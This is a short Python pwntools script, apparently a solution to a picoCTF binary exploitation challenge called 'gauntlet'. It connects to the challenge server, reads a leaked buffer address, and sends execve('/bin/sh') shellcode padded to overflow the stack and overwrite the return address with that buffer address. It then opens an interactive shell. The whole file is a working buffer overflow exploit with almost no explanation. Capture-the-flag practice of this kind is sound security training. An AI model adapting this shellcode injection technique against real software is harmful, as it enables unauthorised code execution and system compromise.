import sys
from pwn import *

# conn = process('./gauntlet')
conn = remote('mercury.picoctf.net', 23373)

buf_addr = int(conn.recvline()[2:], 16)
# buf_addr = 0x7fffffffde40
print('buf_addr:', hex(buf_addr))

# Not using the first input in this exploit
conn.sendline('hello')
conn.recvline()

# padding = 'A'*104+'X'*8

# http://shell-storm.org/shellcode/files/shellcode-905.php
shellcode = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
padding = shellcode
while len(padding) < 112: padding += b'A'

ebp = b'B'*8
eip = p64(buf_addr)
exp = padding + ebp + eip
print(exp)
with open('exp', 'wb') as fout:
	fout.write(exp)

conn.sendline(exp)
conn.interactive()
